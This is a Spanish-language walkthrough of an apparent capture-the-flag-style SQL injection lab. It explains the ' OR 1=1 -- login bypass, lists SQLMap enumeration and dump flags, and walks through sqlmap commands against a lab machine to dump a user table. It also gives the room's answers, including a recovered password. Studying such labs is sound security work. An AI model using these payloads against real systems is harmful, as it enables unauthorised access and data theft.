## Tarea 1: Introducción

### Concepto: ¿Qué es la Inyección SQL?
La Inyección SQL (SQLi) es una técnica donde un atacante interfiere con las consultas que una aplicación realiza a su base de datos.
- **Analogía:** Imagina un sitio web como un camarero tomando pedidos (entrada del usuario) hacia la cocina (base de datos). SQLi es como susurrar instrucciones extra al camarero para alterar la cocina (por ejemplo, "y dame todas las contraseñas del gerente").
- **Mecanismo:** Cuando los sitios web no sanean la entrada del usuario, los atacantes pueden inyectar comandos SQL maliciosos.
- **Impacto:** Puede llevar a acceso no autorizado, robo de datos o eliminación de datos.

### Puntos Clave
- **Lenguaje:** SQL (Structured Query Language) se utiliza para la interacción entre un sitio web y su base de datos.

**Preguntas:**
- **¿Qué lenguaje construye la interacción entre un sitio web y su base de datos?**
  - `sql`

## Tarea 2: Vulnerabilidad de Inyección SQL

### Concepto: Evasión de Lógica
Un ataque común de SQLi implica evadir la autenticación haciendo que una condición sea siempre verdadera.

**Escenario de Ejemplo:**
Una consulta de inicio de sesión podría verse así:
```sql
SELECT * FROM users WHERE username = 'user_input' AND password = 'user_input';
```

Si un atacante ingresa `admin` como nombre de usuario y `' OR 1=1 --` como contraseña, la consulta se convierte en:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1 --';
```
- **`OR 1=1`**: Esta condición es siempre verdadera.
- **`--`**: Esto comenta el resto de la consulta (ignorando la verificación original de la contraseña).
- **Resultado:** La base de datos devuelve el registro del usuario porque `1=1` es verdadero, permitiendo al atacante iniciar sesión sin la contraseña.

### Puntos Clave
- **Lógica Booleana:** El operador `OR` devuelve verdadero si *al menos un* lado es verdadero.
- **Tautología:** `1=1` es siempre verdadero en SQL.

**Preguntas:**
- **¿Qué operador booleano comprueba si al menos un lado del operador es verdadero para que la condición sea verdadera?**
  - `or`
- **¿Es 1=1 en una consulta SQL siempre verdadero? (YEA/NAY)**
  - `Yea`

## Tarea 3: Herramienta Automatizada de Inyección SQL

### Concepto: SQLMap
**SQLMap** es una herramienta de pruebas de penetración de código abierto que automatiza el proceso de detectar y explotar fallos de inyección SQL. Efectivamente "toma el control" de la base de datos.

### Comandos Comunes y Flags
- **Objetivo (Targeting):**
  - `-u <URL>`: Especificar la URL objetivo (ej. `sqlmap -u http://target.com/page.php?id=1`).
  - `--wizard`: Lanza una interfaz de asistente para principiantes.
- **Enumeración:**
  - `--dbs`: Listar todas las bases de datos disponibles.
  - `-D <nombre_base_datos> --tables`: Listar tablas en una base de datos específica.
  - `-D <nombre_base_datos> -T <nombre_tabla> --columns`: Listar columnas en una tabla específica.
  - `-D <nombre_base_datos> -T <nombre_tabla> --dump`: Volcar los datos de una tabla específica.
  - `--dump-all`: Volcar todo (usar con precaución).

**Preguntas:**
- **¿Qué flag en la herramienta SQLMap se usa para extraer todas las bases de datos disponibles?**
  - `--dbs`
- **¿Cuál sería el comando completo de SQLMap para extraer todas las tablas de la base de datos “members”?** (URL Vulnerable: `http://sqlmaptesting.thm/search/cat=1`)
  - `sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables`

## Tarea 4: Ejercicio Práctico

### Escenario
Se nos presenta una página de inicio de sesión que es vulnerable a Inyección SQL. Necesitamos usar SQLMap para extraer información.

**Pasos:**
1.  **Identificar Solicitud Vulnerable:**
    - Capturar la solicitud de inicio de sesión (usando herramientas de desarrollador del navegador o Burp Suite).
    - Estructura de URL identificada: `http://<MACHINE_IP>/ai/includes/user_login?email=test&password=test`
2.  **Enumerar Bases de Datos:**
    - Comando: `sqlmap -u "http://<MACHINE_IP>/ai/includes/user_login?email=test&password=test" --dbs`
    - Resultado: Se encontraron 6 bases de datos (incluyendo `ai`, `information_schema`, `mysql`, etc.).
3.  **Enumerar Tablas en la Base de Datos `ai`:**
    - Comando: `sqlmap -u "http://<MACHINE_IP>/ai/includes/user_login?email=test&password=test" -D ai --tables`
    - Resultado: Se encontró la tabla `user`.
4.  **Volcar Datos de la Tabla `user`:**
    - Comando: `sqlmap -u "http://<MACHINE_IP>/ai/includes/user_login?email=test&password=test" -D ai -T user --dump`
    - Resultado: Columnas extraídas como `id`, `email`, `password`.
    - Se encontró la contraseña para `test@chatai.com`.

**Preguntas y Respuestas:**
- **¿Cuántas bases de datos están disponibles en esta aplicación web?**
  - `6`
- **¿Cuál es el nombre de la tabla disponible en la base de datos “ai”?**
  - `user`
- **¿Cuál es la contraseña del correo test@chatai.com?**
  - `12345678`
